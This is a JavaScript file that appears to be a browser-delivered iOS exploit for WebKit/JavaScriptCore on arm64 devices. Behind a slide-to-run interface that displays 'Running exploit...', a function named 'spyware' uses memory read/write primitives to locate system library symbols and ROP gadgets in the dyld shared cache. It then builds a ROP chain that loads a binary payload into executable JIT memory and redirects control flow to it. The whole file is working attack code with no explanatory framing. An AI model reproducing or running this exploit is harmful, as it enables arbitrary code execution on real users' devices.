var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function(a, d, e) {
 a != Array.prototype && a != Object.prototype && (a[d] = e.value)
};
$jscomp.getGlobal = function(a) {
 return "undefined" != typeof window && window === a ? a : "undefined" != typeof global && null != global ? global : a
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function() {
 $jscomp.initSymbol = function() {};
 $jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol)
};
$jscomp.Symbol = function() {
 var a = 0;
 return function(d) {
  return $jscomp.SYMBOL_PREFIX + (d || "") + a++
 }
}();
$jscomp.initSymbolIterator = function() {
 $jscomp.initSymbol();
 var a = $jscomp.global.Symbol.iterator;
 a || (a = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
 "function" != typeof Array.prototype[a] && $jscomp.defineProperty(Array.prototype, a, {
  configurable: !0,
  writable: !0,
  value: function() {
   return $jscomp.arrayIterator(this)
  }
 });
 $jscomp.initSymbolIterator = function() {}
};
$jscomp.initSymbolAsyncIterator = function() {
 $jscomp.initSymbol();
 var a = $jscomp.global.Symbol.asyncIterator;
 a || (a = $jscomp.global.Symbol.asyncIterator = $jscomp.global.Symbol("asyncIterator"));
 $jscomp.initSymbolAsyncIterator = function() {}
};
$jscomp.arrayIterator = function(a) {
 var d = 0;
 return $jscomp.iteratorPrototype(function() {
  return d < a.length ? {
   done: !1,
   value: a[d++]
  } : {
   done: !0
  }
 })
};
$jscomp.iteratorPrototype = function(a) {
 $jscomp.initSymbolIterator();
 a = {
  next: a
 };
 a[$jscomp.global.Symbol.iterator] = function() {
  return this
 };
 return a
};
$jscomp.polyfill = function(a, d, e, h) {
 if (d) {
  e = $jscomp.global;
  a = a.split(".");
  for (h = 0; h < a.length - 1; h++) {
   var r = a[h];
   r in e || (e[r] = {});
   e = e[r]
  }
  a = a[a.length - 1];
  h = e[a];
  d = d(h);
  d != h && null != d && $jscomp.defineProperty(e, a, {
   configurable: !0,
   writable: !0,
   value: d
  })
 }
};
$jscomp.polyfill("Array.from", function(a) {
 return a ? a : function(a, e, h) {
  $jscomp.initSymbolIterator();
  e = null != e ? e : function(a) {
   return a
  };
  var d = [],
   y = a[Symbol.iterator];
  if ("function" == typeof y) {
   a = y.call(a);
   for (var l = 0; !(y = a.next()).done;) d.push(e.call(h, y.value, l++))
  } else
   for (y = a.length, l = 0; l < y; l++) d.push(e.call(h, a[l], l));
  return d
 }
}, "es6", "es3");
$jscomp.checkStringArgs = function(a, d, e) {
 if (null == a) throw new TypeError("The 'this' value for String.prototype." + e + " must not be null or undefined");
 if (d instanceof RegExp) throw new TypeError("First argument to String.prototype." + e + " must not be a regular expression");
 return a + ""
};
$jscomp.polyfill("String.prototype.startsWith", function(a) {
 return a ? a : function(a, e) {
  var d = $jscomp.checkStringArgs(this, a, "startsWith");
  a += "";
  var r = d.length,
   y = a.length;
  e = Math.max(0, Math.min(e | 0, d.length));
  for (var l = 0; l < y && e < r;)
   if (d[e++] != a[l++]) return !1;
  return l >= y
 }
}, "es6", "es3");
$jscomp.iteratorFromArray = function(a, d) {
 $jscomp.initSymbolIterator();
 a instanceof String && (a += "");
 var e = 0,
  h = {
   next: function() {
    if (e < a.length) {
     var r = e++;
     return {
      value: d(r, a[r]),
      done: !1
     }
    }
    h.next = function() {
     return {
      done: !0,
      value: void 0
     }
    };
    return h.next()
   }
  };
 h[Symbol.iterator] = function() {
  return h
 };
 return h
};
$jscomp.polyfill("Array.prototype.keys", function(a) {
 return a ? a : function() {
  return $jscomp.iteratorFromArray(this, function(a) {
   return a
  })
 }
}, "es6", "es3");
$jscomp.owns = function(a, d) {
 return Object.prototype.hasOwnProperty.call(a, d)
};
$jscomp.polyfill("Object.values", function(a) {
 return a ? a : function(a) {
  var e = [],
   d;
  for (d in a) $jscomp.owns(a, d) && e.push(a[d]);
  return e
 }
}, "es8", "es3");

function hex(a) {
 return ("0" + a.toString(16)).substr(-2)
}

function hexlify(a) {
 for (var d = [], e = 0; e < a.length; e++) d.push(hex(a[e]));
 return d.join("")
}

function unhexlify(a) {
 if (1 == a.length % 2) throw new TypeError("Invalid hex string");
 for (var d = new Uint8Array(a.length / 2), e = 0; e < a.length; e += 2) d[e / 2] = parseInt(a.substr(e, 2), 16);
 return d
}

function hexdump(a) {
 "undefined" !== typeof a.BYTES_PER_ELEMENT && (a = Array.from(a));
 for (var d = [], e = 0; e < a.length; e += 16) {
  var h = a.slice(e, e + 16).map(hex);
  8 < h.length && h.splice(8, 0, " ");
  d.push(h.join(" "))
 }
 return d.join("\n")
}
var Struct = function() {
 var a = new ArrayBuffer(8),
  d = new Uint8Array(a),
  e = new Uint32Array(a),
  h = new Float64Array(a);
 return {
  pack: function(e, d) {
   e[0] = d;
   return new Uint8Array(a, 0, e.BYTES_PER_ELEMENT)
  },
  unpack: function(a, e) {
   if (e.length !== a.BYTES_PER_ELEMENT) throw Error("Invalid bytearray");
   d.set(e);
   return a[0]
  },
  int8: d,
  int32: e,
  float64: h
 }
}();

function ab2str(a) {
 return String.fromCharCode.apply(null, new Uint16Array(a))
}

function str2ab(a) {
 for (var d = new ArrayBuffer(2 * a.length), e = new Uint16Array(d), h = 0, r = a.length; h < r; h++) e[h] = a.charCodeAt(h);
 return d
};
/\b10_\S+ like Mac OS X/.test(navigator.userAgent) || (window.crypto.subtle || window.crypto.webkitSubtle).digest({
 name: "SHA-1"
}, str2ab(window.location.hash)).then(function(a) {
 if ("9e04130fa02fc3c416f28ba556f0165da4d93054" != hexlify(new Uint8Array(a))) throw null;
}).catch(function() {
 window.location.replace("incompatible.html")
});
window.addEventListener("DOMContentLoaded", function() {
 (function(a) {
  var d = document.getElementById("thumbtack"),
   e = document.getElementById("hint"),
   h = 0,
   r = null,
   y = d.parentNode.clientWidth - d.clientWidth - 5,
   l = null,
   p = function(a) {
    h = a;
    e.style.opacity = 1 - a / (.25 * y);
    d.style.left = a + "px"
   },
   g = function(a) {
    r = a;
    l = h;
    d.style.WebkitTransitionProperty = "";
    d.style.WebkitTransitionDuration = "0s";
    return !1
   },
   m = function(a) {
    null !== r && (a -= r, 0 > a ? a = 0 : a >= y && (a = y), p(a + l))
   },
   O = function() {
    if (null !== r) {
     r = null;
     if (.9 <= h / y) return p(y), a(), !1;
     var e =
      h;
     p(0);
     d.style.WebkitTransform = "translateX(" + e + "px)";
     setTimeout(function() {
      d.style.WebkitTransitionProperty = "-webkit-transform";
      d.style.WebkitTransitionDuration = "0.25s";
      d.style.WebkitTransform = "translateX(0px)"
     }, 0);
     return !1
    }
   };
  d.ontouchstart = function(a) {
   return g(a.targetTouches[0].clientX)
  };
  window.ontouchmove = function(a) {
   return m(a.targetTouches[0].clientX)
  };
  window.ontouchend = function(a) {
   return O()
  };
  d.onmousedown = function(a) {
   return g(a.clientX)
  };
  window.onmousemove = function(a) {
   return m(a.clientX)
  };
  window.onmouseup = function(a) {
   return O()
  };
  return this
 })(function() {
  var a = document.getElementById("logo");
  a.parentNode.removeChild(a);
  document.body.className = "wait";
  document.getElementById("notice").textContent = "Running exploit...";
  window.setTimeout(function() {
   window.go()
  }, 10)
 });
 window.ontouchstart = function(a) {
  a.preventDefault();
  return !1
 }
});

function Int64(a) {
 function d(a, e) {
  return function() {
   if (arguments.length != e) throw Error("Not enough arguments for function " + a.name);
   for (var d = 0; d < arguments.length; d++) arguments[d] instanceof Int64 || (arguments[d] = new Int64(arguments[d]));
   return a.apply(this, arguments)
  }
 }
 var e = new Uint8Array(8);
 switch (typeof a) {
  case "number":
   a = "0x" + Math.floor(a).toString(16);
  case "string":
   a.startsWith("0x") && (a = a.substr(2));
   1 == a.length % 2 && (a = "0" + a);
   a = unhexlify(a, 8);
   e.set(Array.from(a).reverse());
   break;
  case "object":
   if (a instanceof Int64) e.set(a.bytes());
   else {
    if (8 != a.length) throw TypeError("Array must have excactly 8 elements.");
    e.set(a)
   }
   break;
  case "undefined":
   break;
  default:
   throw TypeError("Int64 constructor requires an argument.");
 }
 this.asDouble = function() {
  if (255 == e[7] && (255 == e[6] || 254 == e[6])) throw new RangeError("Integer can not be represented by a double");
  return Struct.unpack(Struct.float64, e)
 };
 this.asJSValue = function() {
  if (0 == e[7] && 0 == e[6] || 255 == e[7] && 255 == e[6]) throw new RangeError("Integer can not be represented by a JSValue");
  this.assignSub(this, 281474976710656);
  var a = Struct.unpack(Struct.float64, e);
  this.assignAdd(this, 281474976710656);
  return a
 };
 this.bytes = function() {
  return Array.from(e)
 };
 this.byteAt = function(a) {
  return e[a]
 };
 this.toString = function() {
  return "0x" + hexlify(Array.from(e).reverse())
 };
 this.lo = function() {
  var a = this.bytes();
  return (a[0] | a[1] << 8 | a[2] << 16 | a[3] << 24) >>> 0
 };
 this.hi = function() {
  var a = this.bytes();
  return (a[4] | a[5] << 8 | a[6] << 16 | a[7] << 24) >>> 0
 };
 this.assignNeg = d(function(a) {
  for (var d = 0; 8 > d; d++) e[d] = ~a.byteAt(d);
  return this.assignAdd(this, Int64.One)
 }, 1);
 this.assignAdd = d(function(a, d) {
  for (var h = 0, l = 0; 8 > l; l++) {
   var p = a.byteAt(l) + d.byteAt(l) + h;
   h = 255 < p | 0;
   e[l] = p
  }
  return this
 }, 2);
 this.assignSub = d(function(a, d) {
  for (var h = 0, l = 0; 8 > l; l++) {
   var p = a.byteAt(l) - d.byteAt(l) - h;
   h = 0 > p | 0;
   e[l] = p
  }
  return this
 }, 2)
}
Int64.fromDouble = function(a) {
 a = Struct.pack(Struct.float64, a);
 return new Int64(a)
};

function Neg(a) {
 return (new Int64).assignNeg(a)
}

function Add(a, d) {
 return (new Int64).assignAdd(a, d)
}

function Sub(a, d) {
 return (new Int64).assignSub(a, d)
}
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
(function() {
 function a(a, d) {
  d instanceof Int64 || (d = new Int64(d));
  for (var e = 0; e < a.length; ++e) {
   var g = a[e].fileoff,
    p = Add(g, a[e].size);
   if ((g.hi() < d.hi() || g.hi() == d.hi() && g.lo() <= d.lo()) && (p.hi() > d.hi() || p.hi() == d.hi() && p.lo() > d.lo())) return Add(a[e].addr, Sub(d, g))
  }
  return new Int64("0x4141414141414141")
 }

 function d(d, g, h, l, r) {
  l = Array.from(l);
  void 0 === r && (r = {});
  for (var p = null, k = d.u32(Add(g, 16)), n = 0, m = 32; n < k; ++n) {
   if (2 == d.u32(Add(g, m))) {
    p = d.read(Add(g, m + 8), 16);
    p = {
     symoff: b2u32(p.slice(0, 4)),
     nsyms: b2u32(p.slice(4,
      8)),
     stroff: b2u32(p.slice(8, 12)),
     strsize: b2u32(p.slice(12, 16))
    };
    break
   }
   m += d.u32(Add(g, m + 4))
  }
  null == p && fail("stab");
  var y = a(h, p.stroff),
   B = 0;
  g = function(a) {
   return d.read(Add(y, B + a), 1)[0]
  };
  for (n = 0; n < p.nsyms && 0 < l.length; ++n)
   for (B = d.u32(a(h, p.symoff + 16 * n)), k = 0; k < l.length; ++k)
    if (m = l[k], e(g, m)) {
     r[m] = d.readInt64(a(h, p.symoff + 16 * n + 8));
     l.splice(k, 1);
     break
    }
  return r
 }

 function e(a, d) {
  for (var e = "function" == typeof a ? a : function(d) {
    return a[d]
   }, g = 0; g < d.length; ++g)
   if (e(g) != d.charCodeAt(g)) return !1;
  return 0 == e(d.length)
 }

 function h(a) {
  return b2u32(this.read(a, 4))
 }

 function r(a, d) {
  a instanceof Int64 && (a = a.lo());
  d instanceof Int64 && (d = d.lo());
  a + d > this.length && fail("OOB read: " + a + " -> " + (a + d) + ", size: " + d);
  return this.slice(a, a + d)
 }

 function y(a) {
  return new Int64(this.read(a, 8))
 }

 function l(a, d) {
  a instanceof Int64 && (a = a.lo());
  this.set(d.bytes(), a)
 }
 window.fail = function(a) {
  alert("FAIL: " + a);
  location.reload();
  throw null;
 };
 window.b2u32 = function(a) {
  return (a[0] | a[1] << 8 | a[2] << 16 | a[3] << 24) >>> 0
 };
 window.spyware = function(p, g, m) {
  var O =
   document.createElement("div"),
   J = p.addrof(O);
  J = g.readInt64(J + 24);
  var T = g.readInt64(J);
  g.u32 = h;
  for (var k = g.readInt64(T), n = Sub(k, k.lo() & 4095); !e(g.read(n, 16), "dyld_v1   arm64");) n = Sub(n, 4096);
  var x = null,
   F = g.u32(Add(n, 20)),
   B = g.read(Add(n, g.u32(Add(n, 16))), 32 * F),
   z = [];
  for (k = 0; k < F; ++k) {
   var f = 32 * k;
   f = {
    addr: new Int64(B.slice(f + 0, f + 8)),
    size: new Int64(B.slice(f + 8, f + 16)),
    fileoff: new Int64(B.slice(f + 16, f + 24)),
    maxprot: b2u32(B.slice(f + 24, f + 28)),
    initprot: b2u32(B.slice(f + 28, f + 32))
   };
   z.push(f);
   0 != f.fileoff.hi() || 0 !=
    f.fileoff.lo() || 0 == f.size.hi() && 0 == f.size.lo() || (x = f)
  }
  null == x && fail("base_seg");
  F = Sub(n, x.addr);
  for (k = 0; k < z.length; ++k) z[k].addr = Add(z[k].addr, F);
  var K = {
   "/usr/lib/system/libsystem_platform.dylib": ["__longjmp", "__platform_memmove"],
   "/usr/lib/system/libsystem_kernel.dylib": ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
   "/usr/lib/system/libsystem_c.dylib": ["_usleep"],
   "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore": ["__ZN3JSC32startOfFixedExecutableMemoryPoolE", "__ZN3JSC30endOfFixedExecutableMemoryPoolE"]
  };
  if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
   B = {
    regloader: [2853635040, 2853569505, 2853700578, 2853766115, 2853831652, 2853897189, 3594453888],
    dispatch: [3594453664, 2839772157, 2839695348, 2839631862, 2432762879, 3596551104],
    altdispatch: [3594453664, 3506471871, 2839706621, 2839629812, 2831374326, 3596551104],
    stackloader: [2839968765, 2839891956, 2839828470, 2839764984, 2839701498, 2839638012, 2432812031, 3596551104],
    altstackloader: [3506521023, 2839903229, 2839826420, 2839762934, 2839699448, 2839635962, 2831577084, 3596551104]
   };
   var Q = ["/usr/lib/libLLVM.dylib"]
  } else K["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push("__ZN3JSC29jitWriteSeparateHeapsFunctionE"), B = {
   ldrx8: [4181722088, 4177527400, 2839706621, 2839629812, 2432746495, 3596551104],
   dispatch: [3594453664, 2839772157, 2839695348, 2839631862, 2432762879, 3596551104],
   regloader: [2853569507, 2853897190, 2853700576, 2853372897, 2853635042, 4181722084, 3594453248],
   stackloader: [2839968765, 2839891956, 2839828470, 2839764984, 2839701498, 2839638012, 2432812031, 3596551104],
   movx4: [2853438436, 3594453248],
   ldrx0x0: [4181721088]
  }, Q = ["/usr/lib/PN548.dylib", "/usr/lib/libc++.1.dylib"];
  x = {};
  var C = {},
   D = Add(n, g.u32(Add(n, 24)));
  n = g.u32(Add(n, 28));
  for (k = 0; k < n; ++k) {
   var Y = a(z, g.u32(Add(D, 32 * k + 24))),
    U = function(a) {
     return g.read(Add(Y, a), 1)[0]
    },
    t = Add(g.readInt64(Add(D, 32 * k)), F);
   if (Q.some(function(a) {
     return e(U, a)
    })) {
    var u = g.u32(Add(t, 16)),
     q = 0;
    for (f = 32; q < u; ++q) {
     var v = g.u32(Add(t, f));
     if (25 == v && e(g.read(Add(t, f + 8), 16), "__TEXT")) {
      v = g.u32(Add(t, f + 64));
      u = 0;
      for (q = f + 72; u < v; ++u) {
       if (e(g.read(Add(t,
         q), 16), "__text")) {
        f = Object.keys(B).filter(function(a) {
         return !C.hasOwnProperty[a]
        });
        if (0 == f.length) break;
        u = {};
        for (var w = 0; w < f.length; ++w) u[f[w]] = 0;
        v = Add(g.readInt64(Add(t, q + 32)), F);
        t = g.u32(Add(t, q + 40));
        q = new Uint32Array(t / 4);
        for (w = 0; w < t; w += 4096) {
         var E = 4096;
         t - w < E && (E = t - w);
         for (var L = g.read(Add(v, w), E), A = 0; A < E; A += 4) {
          var I = b2u32(L.slice(A, A + 4));
          q[(w + A) / 4] = I
         }
        }
        for (E = 0; E < t && 0 < f.length; E++)
         for (L = q[E], w = 0; w < f.length; w++)
          if (A = f[w], I = B[A], L == I[u[A]]) {
           if (u[A]++, u[A] == I.length) {
            C[A] = Add(v, 4 * (E - (I.length - 1)));
            f.splice(w,
             1);
            break
           }
          } else u[A] = 0;
        break
       }
       q += 80
      }
      break
     }
     f += g.u32(Add(t, f + 4))
    }
   } else {
    f = null;
    u = Object.keys(K);
    for (q = 0; q < u.length; ++q)
     if (e(U, u[q])) {
      f = K[u[q]];
      break
     }
    null != f && d(g, t, z, f, x)
   }
  }
  C.dispatch || (C.dispatch = C.altdispatch);
  C.stackloader || (C.stackloader = C.altstackloader);
  delete B.altdispatch;
  delete B.altstackloader;
  u = Object.values(K).reduce(function(a, b) {
   b.forEach(function(b) {
    a.push(b)
   });
   return a
  }, []);
  for (k = 0; k < u.length; ++k) z = u[k], null == x[z] && fail(z), x[z] = Add(x[z], F);
  u = Object.keys(B);
  for (k = 0; k < u.length; ++k) z = u[k],
   null == C[z] && fail(z);
  F = x.__longjmp;
  var R = C.regloader,
   M = C.dispatch,
   S = C.stackloader,
   P = C.ldrx8,
   V = C.movx4,
   W = new Int64(g.readInt64(x._mach_task_self_).lo()),
   X = x.__kernelrpc_mach_vm_protect_trap;
  B = x.__platform_memmove;
  K = x._usleep;
  Q = g.readInt64(x.__ZN3JSC32startOfFixedExecutableMemoryPoolE);
  z = g.readInt64(x.__ZN3JSC30endOfFixedExecutableMemoryPoolE);
  x = x.__ZN3JSC29jitWriteSeparateHeapsFunctionE ? g.readInt64(x.__ZN3JSC29jitWriteSeparateHeapsFunctionE) : Int64.Zero;
  m.u32 = h;
  m.read = r;
  m.readInt64 = y;
  m.writeInt64 = l;
  D = new Int64("0xffffffffffffffff");
  n = new Int64(0);
  u = m.u32(16);
  k = 0;
  for (f = 32; k < u; ++k) {
   v = m.u32(f);
   if (25 == v && (q = m.readInt64(f + 48), 0 != q.hi() || 0 != q.lo())) {
    t = m.readInt64(f + 24);
    v = m.readInt64(f + 32);
    v = Add(t, v);
    if (t.hi() < D.hi() || t.hi() == D.hi() && t.lo() <= D.lo()) D = t;
    if (v.hi() > n.hi() || v.hi() == n.hi() && v.lo() > n.lo()) n = v
   }
   f += m.u32(f + 4)
  }
  n = Sub(n, D);
  0 != n.hi() && fail("shsz");
  w = new Uint8Array(n.lo());
  t = g.readInt64(Add(p.addrof(w), 16));
  var H = Sub(z, n);
  H = Sub(H, H.lo() & 16383);
  E = Sub(H, D);
  z = [];
  f = 32;
  for (k = 0; k < u; ++k) {
   v = m.u32(f);
   if (25 ==
    v && (q = m.readInt64(f + 48), 0 != q.hi() || 0 != q.lo())) {
    L = m.readInt64(f + 24);
    v = m.readInt64(f + 32);
    A = m.readInt64(f + 40);
    I = m.readInt64(f + 56);
    if (v.hi() < q.hi() || v.hi() == q.hi() && v.lo() <= q.lo()) q = v;
    z.push({
     addr: Sub(L, D),
     size: q,
     fileoff: A,
     prots: I
    });
    0 != A.hi() && fail("fileoff");
    0 != q.hi() && fail("filesize");
    A = A.lo();
    q = q.lo();
    w.set(m.slice(A, A + q), Sub(L, D).lo())
   }
   f += m.u32(f + 4)
  }
  w.u32 = h;
  w.read = r;
  w.readInt64 = y;
  m = d(w, 0, z, ["genesis"]);
  null == m.genesis && fail("genesis");
  m = Add(m.genesis, E);
  g.writeInt64(Add(T, 24), F);
  g.writeInt64(Add(J,
   88), S);
  f = 4096;
  var c = new Uint32Array(1048576),
   G = g.readInt64(Add(p.addrof(c), 16)),
   b = 1048576 - f,
   Z = function(a, d, e, f, g, h, k) {
    h = h || Int64.Zero;
    c[b++] = 3735879696;
    c[b++] = 3735879697;
    c[b++] = 3735879698;
    c[b++] = 3735879699;
    c[b++] = M.lo();
    c[b++] = M.hi();
    c[b++] = 3735879700;
    c[b++] = 3735879701;
    c[b++] = h.lo();
    c[b++] = h.hi();
    c[b++] = g.lo();
    c[b++] = g.hi();
    c[b++] = f.lo();
    c[b++] = f.hi();
    c[b++] = d.lo();
    c[b++] = d.hi();
    c[b++] = e.lo();
    c[b++] = e.hi();
    c[b++] = a.lo();
    c[b++] = a.hi();
    c[b++] = 3735879704;
    c[b++] = 3735879705;
    c[b++] = 3735879706;
    c[b++] = 3735879707;
    a = b;
    c[b++] = Add(G, 4 * a + 64).lo();
    c[b++] = Add(G, 4 * a + 64).hi();
    c[b++] = R.lo();
    c[b++] = R.hi();
    c[b++] = 3735879712;
    c[b++] = 3735879713;
    c[b++] = 3735879714;
    c[b++] = 3735879715;
    c[b++] = 3735879716;
    c[b++] = 3735879717;
    c[b++] = 3735879718;
    c[b++] = 3735879719;
    c[b++] = 3735879720;
    c[b++] = 3735879721;
    c[b++] = 3735879722;
    c[b++] = 3735879723;
    a = b;
    c[b++] = Add(G, 4 * a + 112).lo();
    c[b++] = Add(G, 4 * a + 112).hi();
    c[b++] = k.lo();
    c[b++] = k.hi()
   },
   aa = function(a, d, e, f, g, h, k) {
    c[b++] = 3735879696;
    c[b++] = 3735879697;
    c[b++] = 3735879698;
    c[b++] = 3735879699;
    c[b++] = 3735884033;
    c[b++] = 3735884034;
    c[b++] = 3735879700;
    c[b++] = 3735879701;
    c[b++] = 3735879702;
    c[b++] = 3735879703;
    c[b++] = g.lo();
    c[b++] = g.hi();
    c[b++] = d.lo();
    c[b++] = d.hi();
    c[b++] = f.lo();
    c[b++] = f.hi();
    c[b++] = g.lo();
    c[b++] = g.hi();
    c[b++] = a.lo();
    c[b++] = a.hi();
    c[b++] = 3735879704;
    c[b++] = 3735879705;
    d = b;
    c[b++] = Add(G, 4 * d).lo();
    c[b++] = Add(G, 4 * d).hi();
    c[b++] = 3735879708;
    c[b++] = 3735879709;
    c[b++] = P.lo();
    c[b++] = P.hi();
    h ? (c[b++] = S.lo(), c[b++] = S.hi()) : (c[b++] = M.lo(), c[b++] = M.hi());
    c[b++] = 3735884801;
    c[b++] = 3735884802;
    c[b++] = 3735884545;
    c[b++] =
     3735884546;
    c[b++] = e.lo();
    c[b++] = e.hi();
    c[b++] = 3735884289;
    c[b++] = 3735884290;
    c[b++] = R.lo();
    c[b++] = R.hi();
    h && (c[b++] = 3668770832, c[b++] = 3668770833, c[b++] = 3668770834, c[b++] = 3668770835, c[b++] = 3668775169, c[b++] = 3668775170, c[b++] = 3668770836, c[b++] = 3668770837, c[b++] = 3668770838, c[b++] = 3668770839, c[b++] = 3668770840, c[b++] = 3668770841, c[b++] = 3668771056, c[b++] = 3668771057, c[b++] = 3668771058, c[b++] = 3668771059, c[b++] = 3668771060, c[b++] = 3668771061, c[b++] = a.lo(), c[b++] = a.hi(), c[b++] = 3668770840, c[b++] = 3668770841, d = b, c[b++] =
     Add(G, 4 * d).lo(), c[b++] = Add(G, 4 * d).hi(), c[b++] = 3668770844, c[b++] = 3668770845, c[b++] = P.lo(), c[b++] = P.hi(), c[b++] = M.lo(), c[b++] = M.hi(), c[b++] = 3668775937, c[b++] = 3668775938, c[b++] = h.lo(), c[b++] = h.hi(), c[b++] = 3668775681, c[b++] = 3668775682, c[b++] = 3668775425, c[b++] = 3668775426, c[b++] = V.lo(), c[b++] = V.hi());
    c[b++] = 3735879714;
    c[b++] = 3735879715;
    c[b++] = 3735879714;
    c[b++] = 3735879715;
    c[b++] = 3735879716;
    c[b++] = 3735879717;
    c[b++] = 3735879718;
    c[b++] = 3735879719;
    c[b++] = 3735879720;
    c[b++] = 3735879721;
    c[b++] = 3735879722;
    c[b++] =
     3735879723;
    c[b++] = 3735879724;
    c[b++] = 3735879725;
    c[b++] = k.lo();
    c[b++] = k.hi()
   },
   N = function(a, b, c, d, e, g, f) {
    b = b || Int64.Zero;
    c = c || Int64.Zero;
    d = d || Int64.Zero;
    e = e || Int64.Zero;
    f = f || S;
    return (P ? aa : Z)(a, b, c, d, e, g, f)
   };
  /\b10_\S+ like Mac OS X/.test(navigator.userAgent) ? (N(X, W, H, n, new Int64(0), new Int64(7)), N(B, H, t, n)) : (x.lo() || x.hi() ? N(x, Sub(H, Q), t, n) : fail("bi0n1c (c)"), z.forEach(function(a) {
   if (a.prots.hi() & 2) {
    var b = Add(a.addr, H);
    N(X, W, b, a.size, new Int64(0), new Int64(19))
   }
  }));
  N(K, new Int64(1E5));
  N(m);
  for (k = 0; 32 >
   k; ++k) c[b++] = 3724591326 + (k << 16);
  p = Add(G, 4 * (1048576 - f));
  g.writeInt64(Add(J, 96), Add(p, 96));
  g.writeInt64(Add(J, 104), p);
  O.addEventListener("click", function() {});
  fail("should never reach this")
 }
})();